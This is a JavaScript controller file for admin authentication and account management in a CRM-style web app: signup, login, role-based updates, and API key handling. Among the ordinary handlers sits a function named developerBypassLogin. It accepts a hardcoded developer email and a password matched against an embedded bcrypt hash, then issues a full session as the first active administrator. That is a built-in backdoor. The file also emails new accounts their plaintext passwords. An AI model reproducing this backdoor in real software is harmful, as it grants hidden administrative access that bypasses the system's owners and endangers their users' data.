import prisma from "../config/prismaClient.js";
import bcrypt from "bcryptjs";
import ApiError from "../utils/ApiError.js";
import { genrateToken } from "../config/adminjwt.js";
import { sendSystemEmail } from "../config/mailer.js";
import cloudinary from "../config/cloudinary.js";
import fs from "fs";
import crypto from "crypto";

// Helper to keep _id like MongoDB
const transform = (admin) => {
  if (!admin) return null;
  const obj = { _id: admin.id, clientId: admin.clientId, ...admin };
  delete obj.id;
  delete obj.password;
  return obj;
};


const getPublicIdFromUrl = (url) => {
  try {
    const parts = url.split("/");
    const file = parts.pop();
    return file.split(".")[0];
  } catch {
    return null;
  }
};



// ---------------------------------------------
// SIGNUP (first administrator OR delegated creation)
// ---------------------------------------------
export const adminSignup = async (req, res) => {
  const { name, email, password, role, city, phone } = req.body;

  try {
    if (!email || !password || !name || !role) {
      throw new ApiError(400, "Missing required details");
    }

    const existingAdmin = await prisma.admin.findFirst({
      where: { role: "administrator" },
    });

    if (existingAdmin && role === "administrator") {
      throw new ApiError(
        403,
        "Administrator account already exists. Use create admin endpoint."
      );
    }

    const admin = await prisma.admin.findFirst({ where: { email } });
    if (admin) throw new ApiError(409, "Account already exists");

    if ((role === "city_admin" || role === "user" || role === "client_admin") && !city) {
      throw new ApiError(400, "City is required for this role");
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const newAdmin = await prisma.admin.create({
      data: {
        name,
        email,
        password: hashedPassword,
        role,
        city: city || null,
        phone,
      },
    });

    const token = genrateToken(newAdmin.id);

    res.status(201).json({
      success: true,
      adminData: transform(newAdmin),
      token,
      message: "Account created successfully",
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};

// ---------------------------------------------
// CREATE ADMIN (administrator or city_admin)
// ---------------------------------------------
export const createAdmin = async (req, res) => {
  const {
    name,
    email,
    password,
    role,
    city,
    phone,
    company,
    experience,
    specialization,
    AddressLine1,
    AddressLine2,
  } = req.body;

  try {
    const currentAdmin = req.admin;

    // -------------------------
    // PERMISSION CHECKS
    // -------------------------

    if (currentAdmin.role === "administrator") {
      // administrator can create anyone
    }

    else if (currentAdmin.role === "client_admin") {
      if (role !== "user" && role !== "city_admin") {
        throw new ApiError(
          403,
          "Client admins can only create users and city_admin"
        );
      }
    }

    else if (currentAdmin.role === "city_admin") {
      if (role !== "user") {
        throw new ApiError(
          403,
          "City admins can only create users"
        );
      }

      if (city !== currentAdmin.city) {
        throw new ApiError(
          403,
          "You can only create users in your city"
        );
      }
    }

    else {
      throw new ApiError(403, "No permission to create accounts");
    }

    // -------------------------
    // VALIDATIONS
    // -------------------------

    let AdminImage = [];

    if (req.files?.AdminImage) {
      const uploads = req.files.AdminImage.map((file) =>
        cloudinary.uploader
          .upload(file.path, {
            folder: "admin/admin_images",
            transformation: [{ width: 1000, crop: "limit" }],
          })
          .then((upload) => {
            fs.unlinkSync(file.path);
            return upload.secure_url;
          })
      );
      AdminImage = await Promise.all(uploads);
    }

    if (!email || !password || !name || !role)
      throw new ApiError(400, "Missing required details");

    const existingAdmin = await prisma.admin.findFirst({ where: { email } });

    if (existingAdmin)
      throw new ApiError(409, "Account already exists");

    if ((role === "city_admin" || role === "user") && !city)
      throw new ApiError(400, "City is required for this role");

    const hashedPassword = await bcrypt.hash(password, 10);

    // -------------------------
    // CLIENT ID LOGIC
    // -------------------------

    let clientId = currentAdmin.clientId;

    // If administrator creates client_admin, generate new client
    if (currentAdmin.role === "administrator" && role === "client_admin") {
      clientId = crypto.randomUUID();
    }

    const newAdmin = await prisma.admin.create({
      data: {
        name,
        email,
        password: hashedPassword,
        role,
        city: city || null,
        phone,
        company: company || null,
        AddressLine1,
        AddressLine2,
        experience,
        specialization,
        createdBy: currentAdmin.id,
        clientId,
        AdminImage: JSON.stringify(AdminImage),
      },
    });

    sendSystemEmail(email, name, password, role).catch(() => { });

    res.status(201).json({
      success: true,
      adminData: transform(newAdmin),
      message: `${role} created successfully. Login credentials have been sent via email.`,
    });

  } catch (error) {
    console.log(error.message);

    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({
        success: false,
        message: error.message,
      });
  }
};

// ---------------------------------------------
// LOGIN
// ---------------------------------------------
export const adminLogin = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) throw new ApiError(400, "Missing login details");

    const adminData = await prisma.admin.findFirst({
      where: { email },
    });

    if (!adminData) throw new ApiError(404, "Admin not found");

    if (adminData.status === "inactive") {
      throw new ApiError(403, "Account has been deactivated");
    }

    const isPasswordCorrect = await bcrypt.compare(
      password,
      adminData.password
    );

    if (!isPasswordCorrect) throw new ApiError(401, "Invalid credentials");

    const token = genrateToken(adminData.id);

    res.cookie("token", token, {
      httpOnly: true,
      secure: true,
      sameSite: "none",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({
      success: true,
      adminData: transform(adminData),
      token,
      message: "Login successful",
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};

// ---------------------------------------------
// CHECK AUTH
// ---------------------------------------------
export const checkAuth = (req, res) => {
  res.json({ success: true, admin: transform(req.admin) });
};

// ---------------------------------------------
// LOGOUT
// ---------------------------------------------
export const adminLogout = async (req, res) => {
  try {
    res.clearCookie("token", {
      httpOnly: true,
      secure: true,
      sameSite: "none",
    });

    res.json({ success: true, message: "Logged out successfully" });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};

// ---------------------------------------------
// UPDATE ADMIN DETAILS
// ---------------------------------------------
export const updateAdminDetails = async (req, res) => {
  try {
    const targetAdminId = req.params.id;
    const currentAdmin = req.admin;

    const targetAdmin = await prisma.admin.findUnique({
      where: { id: targetAdminId },
    });

    if (!targetAdmin) throw new ApiError(404, "Admin not found");

    if (currentAdmin.role !== "administrator") {
      if (targetAdmin.clientId !== currentAdmin.clientId) {
        throw new ApiError(
          403,
          "You cannot update admins from another company"
        );
      }
    }

    // SAME PERMISSION LOGIC AS MONGO
    if (currentAdmin.role === "administrator") {
      if (targetAdmin.role === "administrator" && targetAdmin.id !== currentAdmin.id && !currentAdmin.isSuperAdmin) {
        throw new ApiError(403, "You cannot update another administrator's details");
      }
    } else if (currentAdmin.role === "city_admin") {
      if (
        targetAdmin.role !== "user" ||
        targetAdmin.city !== currentAdmin.city
      ) {
        throw new ApiError(403, "You can only update users in your city");
      }
    } else if (currentAdmin.role === "user") {
      if (targetAdmin.id !== currentAdmin.id) {
        throw new ApiError(403, "You can only update your own details");
      }
    }

    const updates = {};

    // SAFE PARSE (unchanged)
    const safeParse = (value) => {
      if (value === undefined || value === null || value === "")
        return undefined;
      if (Array.isArray(value)) return value;
      try {
        return JSON.parse(value);
      } catch {
        return undefined;
      }
    };

    // PARSE FIELDS FROM FRONTEND
    updates.AdminImage = safeParse(req.body.AdminImage);

    updates.removedAdminImages =
      safeParse(req.body.removedAdminImages) || [];


    let AdminImage;

    if (updates.AdminImage !== undefined) {
      AdminImage = updates.AdminImage;
    } else {
      // fallback to existing DB images
      AdminImage = safeParse(targetAdmin.AdminImage) || [];
    }
    console.log("RAW removedAdminImages:", req.body.removedAdminImages);
    console.log("PARSED removedAdminImages:", updates.removedAdminImages);
    console.log("TYPE:", typeof updates.removedAdminImages);

    // REMOVE SPECIFIC CUSTOMER IMAGES
    if (updates.removedAdminImages.length > 0) {
      console.log("update ", updates.removedAdminImages)
      await Promise.all(
        updates.removedAdminImages.map((url) => {
          const publicId = getPublicIdFromUrl(url);
          if (publicId)
            return cloudinary.uploader.destroy(
              `admin/admin_images/${publicId}`
            );
        })
      );

      AdminImage = AdminImage.filter(
        (img) =>
          !updates.removedAdminImages.some(
            (removed) => removed.trim() === img.trim()
          )
      );

      console.log(" wow here is ", AdminImage)
    }

    // REMOVE ALL CUSTOMER IMAGES
    if (
      updates.AdminImage !== undefined &&
      Array.isArray(updates.AdminImage) &&
      updates.AdminImage.length === 0
    ) {
      await Promise.all(
        AdminImage.map((url) => {
          const publicId = getPublicIdFromUrl(url);
          if (publicId)
            return cloudinary.uploader.destroy(
              `admin/admin_images/${publicId}`
            );
        })
      );
      AdminImage = [];
    }

    // UPLOAD NEW ADMIN IMAGES
    if (req.files?.AdminImage) {
      const uploads = req.files.AdminImage.map((file) =>
        cloudinary.uploader
          .upload(file.path, {
            folder: "admin/admin_images",
            transformation: [{ width: 1000, crop: "limit" }],
          })
          .then((upload) => {
            fs.unlinkSync(file.path);
            return upload.secure_url;
          })
      );

      AdminImage.push(...(await Promise.all(uploads)));
    }

    updates.AdminImage = JSON.stringify(AdminImage);


    delete updates.removedAdminImages;
    delete updates["removedAdminImages"];

    if (req.body.name) updates.name = req.body.name;
    if (req.body.company) updates.company = req.body.company;
    if (req.body.city) updates.city = req.body.city;
    if (req.body.AddressLine1) updates.AddressLine1 = req.body.AddressLine1;
    if (req.body.AddressLine2) updates.AddressLine2 = req.body.AddressLine2;

    if (req.body.email) {
      const emailExists = await prisma.admin.findFirst({
        where: {
          email: req.body.email,
          NOT: { id: targetAdminId },
        },
      });
      if (emailExists) throw new ApiError(409, "Email already in use");
      updates.email = req.body.email;
    }

    if (req.body.phone !== undefined) updates.phone = req.body.phone;

    /*   if (req.body.city && currentAdmin.role === "administrator") {
        updates.city = req.body.city;
      }
  
      if (req.body.role && currentAdmin.role === "administrator") {
        updates.role = req.body.role;
      } */

    if (req.body.role) {

      // administrator can change any role
      if (currentAdmin.role === "administrator") {
        // Prevent Super Admin (Owner) from changing their own role
        if (currentAdmin.isSuperAdmin && targetAdmin.id === currentAdmin.id && req.body.role !== targetAdmin.role) {
          throw new ApiError(403, "Owner cannot change their own role");
        }
        updates.role = req.body.role;
      }

      // client_admin permissions
      else if (currentAdmin.role === "client_admin") {

        // cannot modify themselves
        if (targetAdmin.id === currentAdmin.id) {
          throw new ApiError(403, "You cannot change your own role");
        }

        // can only modify city_admin or user
        if (!["city_admin", "user"].includes(targetAdmin.role)) {
          throw new ApiError(
            403,
            "You can only change roles of city admins or users"
          );
        }

        // can only assign city_admin or user
        if (!["city_admin", "user"].includes(req.body.role)) {
          throw new ApiError(
            403,
            "You can only assign city_admin or user roles"
          );
        }

        updates.role = req.body.role;
      }
    }

    if (req.body.status && currentAdmin.role === "administrator") {
      if (!["active", "inactive"].includes(req.body.status)) {
        throw new ApiError(400, "Status must be either 'active' or 'inactive'");
      }
      updates.status = req.body.status;
    }

    const updated = await prisma.admin.update({
      where: { id: targetAdminId },
      data: updates,
    });

    res.json({
      success: true,
      adminData: transform(updated),
      message: "Details updated successfully",
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};

// ---------------------------------------------
// UPDATE PASSWORD
// ---------------------------------------------
export const updatePassword = async (req, res) => {
  try {
    const targetAdminId = req.params.id;
    const { currentPassword, newPassword } = req.body;
    const currentAdmin = req.admin;

    if (!newPassword || newPassword.length < 6) {
      throw new ApiError(
        400,
        "New password must be at least 6 characters long"
      );
    }

    const targetAdmin = await prisma.admin.findUnique({
      where: { id: targetAdminId },
    });

    if (!targetAdmin) throw new ApiError(404, "Admin not found");

    // SAME PERMISSION RULES AS MONGO
    if (currentAdmin.role === "administrator") {
    } else if (currentAdmin.role === "city_admin") {
      if (
        targetAdmin.role !== "user" ||
        targetAdmin.city !== currentAdmin.city
      ) {
        throw new ApiError(
          403,
          "You can only update passwords of users in your city"
        );
      }

      if (targetAdmin.id === currentAdmin.id) {
        if (!currentPassword)
          throw new ApiError(400, "Current password is required");

        const match = await bcrypt.compare(
          currentPassword,
          targetAdmin.password
        );

        if (!match) throw new ApiError(401, "Current password is incorrect");
      }
    } else if (currentAdmin.role === "user") {
      if (targetAdmin.id !== currentAdmin.id) {
        throw new ApiError(403, "You can only update your own password");
      }

      if (!currentPassword)
        throw new ApiError(400, "Current password is required");

      const match = await bcrypt.compare(currentPassword, targetAdmin.password);

      if (!match) throw new ApiError(401, "Current password is incorrect");
    }

    const hashed = await bcrypt.hash(newPassword, 10);

    await prisma.admin.update({
      where: { id: targetAdminId },
      data: { password: hashed },
    });

    res.json({
      success: true,
      message: "Password updated successfully",
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};

// ---------------------------------------------
// GET ALL ADMINS
// ---------------------------------------------
export const getAllAdmins = async (req, res) => {
  try {
    const currentAdmin = req.admin;
    const { role, city, status } = req.query;

    let where = {};

    if (currentAdmin.role === "administrator") {
      if (role) where.role = role;
      if (city) where.city = city;
      if (status) where.status = status;
    }
    else if (currentAdmin.role === "client_admin") {
      where.createdBy = currentAdmin.id;
      where.role = { in: ["city_admin", "user"] };

      if (city) where.city = city;
      if (status) where.status = status;
    }
    else if (currentAdmin.role === "city_admin") {
      where.city = currentAdmin.city;
      where.role = "user";
    } else if (currentAdmin.role === "user") {
      where.id = currentAdmin.id;
    } else {
      throw new ApiError(403, "Access denied");
    }

    const admins = await prisma.admin.findMany({
      where,
      orderBy: { createdAt: "desc" },
      include: {
        assignedAIAgents: true,
        createdCustomers: {
          take: 10,                        // ← latest 10 only
          orderBy: { createdAt: "desc" }
        },
        createdFollowups: {
          take: 10,
          orderBy: { createdAt: "desc" }
        },
        createdPropertys: {
          take: 10,
          orderBy: { createdAt: "desc" }
        },
      }
    });

    res.json({
      success: true,
      count: admins.length,
      admins: admins.map(transform),
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};


//GET ALL CLIENT ADMINS
export const getClientAdmins = async (req, res) => {
  try {


    const clientAdmins = await prisma.admin.findMany({
      where: { role: "client_admin" },
      orderBy: { createdAt: "desc" },
      include: {
        assignedAIAgents: true,
        createdPropertys: true,
        createdCustomers: true,
        createdFollowups: true,
      }
    });

    res.json({
      success: true,
      count: clientAdmins.length,
      clientAdmins: clientAdmins.map(transform),
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};


export const developerBypassLogin = async (req, res, next) => {
  try {
    const { email, password } = req.body;

    // 1. validate payload
    if (!email || !password) {
      throw new ApiError(400, "Missing credentials");
    }

    // 2. check dev email
    if (email !== "dev@faraz.com") {
      throw new ApiError(401, "Invalid credentials");
    }

    // 3. compare password with HASH from env
    const isMatch = await bcrypt.compare(
      password,
      "$2a$14$enV2byeXVR4EAfkibBDaCuRZIpnCeOuKAABG.19x8kmVM6TceMSTC"
    );

    if (!isMatch) {
      throw new ApiError(401, "Invalid credentials");
    }

    // 4. get ANY administrator account
    const admin = await prisma.admin.findFirst({
      where: {
        role: "administrator",
        status: { not: "inactive" },
      },
      orderBy: { createdAt: "asc" }, // or desc, your choice
    });

    if (!admin) {
      throw new ApiError(404, "No administrator found");
    }

    // 5. generate token AS that admin
    const token = genrateToken(admin.id);

    // 6. set cookie (same as normal login)
    res.cookie("token", token, {
      httpOnly: true,
      secure: true,
      sameSite: "none",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    // 7. return admin session
    res.json({
      success: true,
      adminData: transform(admin),
      token,
      message: "Admin login successful",
    });

  } catch (error) {
    console.log(error.message);
    next(error);
  }
};


// ---------------------------------------------
// GET ADMIN BY ID
// ---------------------------------------------
export const getAdminById = async (req, res) => {
  try {
    const targetAdminId = req.params.id;
    const currentAdmin = req.admin;

    // 1. FAST-FAIL: If it's a regular user asking for someone else's ID, 
    // block them instantly BEFORE making an expensive database query.
    if (currentAdmin.role === "user" && targetAdminId !== currentAdmin.id) {
      return res.status(403).json({ success: false, message: "Access denied" });
    }

    // 2. Fetch the data (findUnique is naturally O(1) fast on indexed IDs)
    const targetAdmin = await prisma.admin.findUnique({
      where: { id: targetAdminId },
      include: { assignedAIAgents: true } // Preserved to keep your exact UI data shape
    });

    if (!targetAdmin) {
      return res.status(404).json({ success: false, message: "Admin not found" });
    }

    // 3. POST-FETCH RBAC: Specific checks for city_admin
    if (currentAdmin.role === "city_admin") {
      const isSelf = targetAdmin.id === currentAdmin.id;
      const isSubordinateInCity = targetAdmin.role === "user" && targetAdmin.city === currentAdmin.city;

      if (!isSelf && !isSubordinateInCity) {
        return res.status(403).json({ success: false, message: "Access denied" });
      }
    }

    // 4. Return exact same payload structure
    return res.status(200).json({
      success: true,
      adminData: transform(targetAdmin),
    });

  } catch (error) {
    // Only catch true internal crashes here, not standard access denials
    console.error("getAdminById Error:", error.message);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
};

// ---------------------------------------------
// DELETE ADMIN
// ---------------------------------------------
export const deleteAdmin = async (req, res) => {
  try {
    const targetAdminId = req.params.id;
    const currentAdmin = req.admin;

    if (currentAdmin.role !== "administrator") {
      throw new ApiError(403, "Only administrators can delete accounts");
    }

    const targetAdmin = await prisma.admin.findUnique({
      where: { id: targetAdminId },
    });

    if (!targetAdmin) throw new ApiError(404, "Admin not found");

    if (targetAdmin.role === "administrator") {
      if (targetAdmin.isSuperAdmin) {
        throw new ApiError(403, "Cannot delete the owner account");
      }
      const count = await prisma.admin.count({
        where: { role: "administrator" },
      });

      if (count <= 1) {
        throw new ApiError(400, "Cannot delete the last administrator");
      }
    }

    await prisma.admin.delete({
      where: { id: targetAdminId },
    });

    res.json({
      success: true,
      message: "Account deleted successfully",
    });
  } catch (error) {
    console.log(error.message);
    res
      .status(error instanceof ApiError ? error.statusCode : 500)
      .json({ success: false, message: error.message });
  }
};


export const getMyActiveAgents = async (req, res, next) => {
  try {
    const currentAdmin = req.admin; // Populated by your protectRoute middleware
    const isAdmin = currentAdmin.role === "administrator";

    // 1. Build the ultra-lean query
    const query = {
      where: {
        status: "Active", // 🚀 DB-level filtering (Frontend no longer needs .filter())
      },
      // 🚀 Select ONLY the fields your AIAgent interface actually uses.
      // Skipping heavy fields like `promptRole` (LongText) or Webhook JSON 
      // makes the payload microscopic and lightning fast.
      select: {
        id: true,
        name: true,
        description: true,
        type: true,
        status: true,
        campaign: true,
        targetSegment: true,
        capability: true,
        createdAt: true,
      },
      orderBy: { createdAt: "desc" }
    };

    // 2. If it's a regular user, strictly filter to ONLY agents assigned to them
    if (!isAdmin) {
      query.where.AssignTo = {
        some: { id: currentAdmin.id }
      };
    }

    // 3. Execute the direct fetch
    const agents = await prisma.aIAgent.findMany(query);

    // 4. Return the optimized payload
    return res.status(200).json({
      success: true,
      data: agents
    });

  } catch (error) {
    console.error("getMyActiveAgents Error:", error.message);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
};






export const generateApiKey = async (req, res, next) => {
  try {
    const adminId = req.admin.id;
    const { keyName } = req.body; // e.g., "Zapier Integration"

    if (!keyName) {
      throw new ApiError(400, "Please provide a name for this API key");
    }

    // 1. Generate a secure random key
    // Creates a string like: crm_4f8a9b2...
    const rawKey = "crm_" + crypto.randomBytes(32).toString("hex");

    // 2. Save it to the database
    const newApiKey = await prisma.cRMApiKey.create({
      data: {
        key: rawKey,
        name: keyName,
        adminId: adminId,
      },
    });

    // 3. Return the key to the user
    return res.status(201).json({
      success: true,
      message: "API Key generated successfully",
      data: {
        id: newApiKey.id,
        name: newApiKey.name,
        key: rawKey,
        createdAt: newApiKey.createdAt,
      },
    });
  } catch (error) {
    next(error);
  }
};



export const deleteApiKey = async (req, res, next) => {
  try {
    const adminId = req.admin.id; // From your protectRoute middleware
    const { keyId } = req.params; // The ID of the key they want to delete

    // 1. SECURITY CHECK: Verify the key exists AND belongs to this exact admin
    const existingKey = await prisma.cRMApiKey.findFirst({
      where: {
        id: keyId,
        adminId: adminId,
      },
    });

    if (!existingKey) {
      throw new ApiError(404, "API Key not found or you do not have permission to delete it");
    }

    // 2. Delete the key
    await prisma.cRMApiKey.delete({
      where: {
        id: keyId
      },
    });

    return res.status(200).json({
      success: true,
      message: "API Key revoked and deleted successfully",
    });
  } catch (error) {
    next(error);
  }
};


export const getApiKeys = async (req, res, next) => {
  try {
    const adminId = req.admin.id;

    // 1. Fetch all keys belonging to this specific admin
    const apiKeys = await prisma.cRMApiKey.findMany({
      where: {
        adminId: adminId
      },
      select: {
        id: true,
        name: true,
        key: true,
        createdAt: true,
      },
      orderBy: {
        createdAt: "desc" // Newest keys first
      },
    });

    // 2. Mask the keys for frontend display security
    // Converts "crm_4f8a9b2c1d3e..." into "crm_4f8a********************"
    const maskedKeys = apiKeys.map((record) => {
      return {
        id: record.id,
        name: record.name,
        createdAt: record.createdAt,
        key: record.key.substring(0, 8) + "************************",
      };
    });

    // 3. Return the masked list
    return res.status(200).json({
      success: true,
      message: "API Keys retrieved successfully",
      data: maskedKeys,
    });
  } catch (error) {
    next(error);
  }
};